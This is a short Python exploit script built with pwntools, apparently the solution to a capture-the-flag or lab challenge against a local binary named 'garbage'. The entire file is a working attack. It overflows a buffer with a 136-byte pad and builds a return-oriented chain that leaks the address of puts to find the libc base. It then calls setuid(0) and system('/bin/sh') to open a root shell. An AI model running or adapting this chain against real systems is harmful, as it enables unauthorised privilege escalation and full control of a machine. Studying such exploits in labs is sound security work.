#!/usr/bin/python3
from pwn import process, p64, u64

shell = process("./garbage")

offset = 136
junk = b"A" * offset

plt_puts = p64(0x401050)
got_puts = p64(0x404028)
pop_rdi = p64(0x40179b)
main = p64(0x401619)
ret = p64(0x401016)

payload  = b""
payload += junk
payload += pop_rdi + got_puts
payload += plt_puts
payload += main

shell.sendline(payload)
shell.recvuntil(b"access denied.\n")

leak_puts = u64(shell.recvline().strip().ljust(8, b"\x00"))
libc_base = leak_puts - 0x809c0

setuid = p64(libc_base + 0xe5970)
system = p64(libc_base + 0x4f440)
bin_sh = p64(libc_base + 0x1b3e9a)

payload  = b""
payload += junk
payload += pop_rdi + p64(0)
payload += setuid
payload += main

shell.sendline(payload)
shell.recvuntil(b"access denied.\n")

payload  = b""
payload += junk
payload += pop_rdi + bin_sh
payload += ret
payload += system

shell.sendline(payload)
shell.recvuntil(b"access denied.\n")

shell.interactive()
